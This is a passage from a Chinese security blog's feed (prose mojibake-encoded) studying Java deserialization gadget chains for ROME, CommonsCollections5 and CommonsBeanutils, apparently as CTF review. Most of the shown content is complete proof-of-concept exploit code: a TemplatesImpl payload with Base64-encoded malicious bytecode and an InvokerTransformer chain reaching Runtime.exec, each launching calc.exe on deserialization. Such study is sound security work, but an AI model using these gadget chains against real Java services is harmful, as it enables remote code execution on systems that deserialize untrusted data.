·æˆ‘ä»¬ä¸ä»…è°ƒç”¨äº†<strong>ObjectBean#hashCode</strong>è¿˜è°ƒç”¨äº†<strong>ObjectBean#toString</strong>ã€‚ä¸ºäº†é¿å…åœ¨åºåˆ—åŒ–ä¹‹å‰å°±å¼¹å‡ºè®¡ç®—å™¨ã€‚æˆ‘ä»¬å¯ä»¥åœ¨putè¿›mapä¸­ä¹‹ååœ¨è¿›è¡Œ<strong>åå°„</strong>ä¿®æ”¹å€¼å°±å¯ä»¥äº†ã€‚</p><h2 id="HashMap-readObject"><a href="#HashMap-readObject" class="headerlink" title="HashMap#readObject"></a>HashMap#readObject</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061420627.png" alt="QQæˆªå›¾20220306134313"><br>è·Ÿè¿›hashã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203061343916.png" alt="QQæˆªå›¾20220306134328"><br>è¿™é‡Œä¼šè°ƒç”¨**key.hashCode()**ã€‚<br>è¿™é‡Œå¾—keyå¯ä»¥æ§åˆ¶ã€‚é‚£ä¹ˆæˆ‘ä»¬ä¸€æ¡å®Œæ•´å¾—é“¾å­å°±å‡ºæ¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RomeDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;xsw6a&quot;</span>));<br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(root, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;xsw6a&quot;</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> ObjectBean.class.getDeclaredField(<span class="hljs-string">&quot;_equalsBean&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(root, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, delegate));<br><br>        serialize(map);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ROME</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonCollections5</title>
    <link href="/2022/03/05/CommonCollections5/"/>
    <url>/2022/03/05/CommonCollections5/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollections5"><a href="#CommonCollections5" class="headerlink" title="CommonCollections5"></a>CommonCollections5</h1><p>è¿˜æ˜¯å†çœ‹romeé“¾ï¼Œçœ‹åˆ°æœ‰åˆ©ç”¨<strong>BadAttributeValueExpException</strong>å°±æƒ³èµ·cc5ã€‚å€Ÿæ­¤å¤ä¹ ä¸‹å§ã€‚</p><h2 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>            BadAttributeValueExpException.readObject()<br>                TiedMapEntry.toString()<br>                    LazyMap.get()<br>                        ChainedTransformer.transform()<br>                            ConstantTransformer.transform()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Class.getMethod()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.getRuntime()<br>                            InvokerTransformer.transform()<br>                                Method.invoke()<br>                                    Runtime.exec()<br></code></pre></td></tr></table></figure><h2 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2><p>å€¼å¾—æ³¨æ„çš„ä¸‰ä¸ªä¸ªåœ°æ–¹ã€‚<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221266.png" alt="QQæˆªå›¾20220305220944"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221136.png" alt="QQæˆªå›¾20220305220912"></p><p>åœ¨è°ƒç”¨<strong>toString</strong>çš„æ—¶å€™ä¼šè·‘åˆ°<strong>getValueï¼ˆï¼‰</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221203.png" alt="QQæˆªå›¾20220305221112"></p><p>ç„¶åè°ƒç”¨<strong>get</strong>ï¼Œè¿™é‡Œå°±è·ŸLazyMapåé¢çš„é“¾å­å·®ä¸å¤šã€‚<br>ä¸‹é¢å°±è¦æ‰¾ååºåˆ—åŒ–çš„ç‚¹ã€‚</p><h1 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203052221228.png" alt="QQæˆªå›¾20220305221328"></p><p>å¯ä»¥é€šè¿‡åå°„æ„é€ ã€‚é‚£ä¹ˆä¸€æ¡å®Œæ•´çš„é“¾å­å°±å‡ºæ¥äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(decorate,<span class="hljs-number">123</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br>       serialize(badAttributeValueExpException);<br>       unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ccé“¾</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsBeanutils</title>
    <link href="/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/"/>
    <url>/2022/03/05/CommonsBeanutils%EF%BC%88%E6%97%A0cc%E4%BE%9D%E8%B5%96%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h1><p>æ˜¨å¤©åšåˆ°D3CTFæ¯”èµ›çš„ä¸€é“é¢˜ï¼Œemmmç™½å·ä¸€æ™šä¸Šã€‚åé¢çœ‹æ˜¯ROMEï¼Œç„¶åçœ‹äº†çœ‹ç½‘ä¸Šçš„ROMEé“¾ï¼Œè¦ç”¨åˆ°<strong>CommonsBeanutils</strong>ï¼Œä»Šå¤©å°±æ¥å¤ä¹ ä¸‹<strong>CommonsBeanutils</strong>ã€‚</p><h2 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h2><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;project xmlns=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br>         xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br>         xsi:schemaLocation=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;<br>    &lt;modelVersion&gt;<span class="hljs-number">4.0</span><span class="hljs-number">.0</span>&lt;/modelVersion&gt;<br><br>    &lt;groupId&gt;org.example&lt;/groupId&gt;<br>    &lt;artifactId&gt;commonsbeanutils&lt;/artifactId&gt;<br>    &lt;version&gt;<span class="hljs-number">1.0</span>-SNAPSHOT&lt;/version&gt;<br><br>    &lt;properties&gt;<br>        &lt;maven.compiler.source&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.source&gt;<br>        &lt;maven.compiler.target&gt;<span class="hljs-number">8</span>&lt;/maven.compiler.target&gt;<br>    &lt;/properties&gt;<br>    &lt;dependencies&gt;<br>        &lt;dependency&gt;<br>            &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;<br><br>        &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;<br><br>        &lt;version&gt;<span class="hljs-number">1.8</span><span class="hljs-number">.3</span>&lt;/version&gt;<br>        &lt;/dependency&gt;<br><br>        &lt;dependency&gt;<br><br>            &lt;groupId&gt;org.javassist&lt;/groupId&gt;<br><br>            &lt;artifactId&gt;javassist&lt;/artifactId&gt;<br><br>            &lt;version&gt;<span class="hljs-number">3.21</span><span class="hljs-number">.0</span>-GA&lt;/version&gt;<br><br>        &lt;/dependency&gt;<br>    &lt;/dependencies&gt;<br>&lt;/project&gt;<br></code></pre></td></tr></table></figure><p>è·Ÿç€pç¥èµ°ã€‚<br>commons-beanutilsä¸­æä¾›äº†è¿™æ ·ä¸€ä¸ªæ–¹æ³•ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203051437577.png" alt="QQæˆªå›¾20220305143634"></p><p>ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥è¯»å–å±æ€§ä¸­çš„è¯»æ–¹æ³•å³getNameæ–¹æ³•ã€‚å½“ç„¶è¿™é‡Œè¦æ»¡è¶³ç‰¹æ®Šçš„å‘½åæ–¹å¼ã€‚getN(å¤§å†™)ameã€‚</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JavaBean</span> &#123;<br>   <span class="hljs-keyword">private</span> String name=<span class="hljs-string">&quot;xsw6a&quot;</span>;<br>   <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> 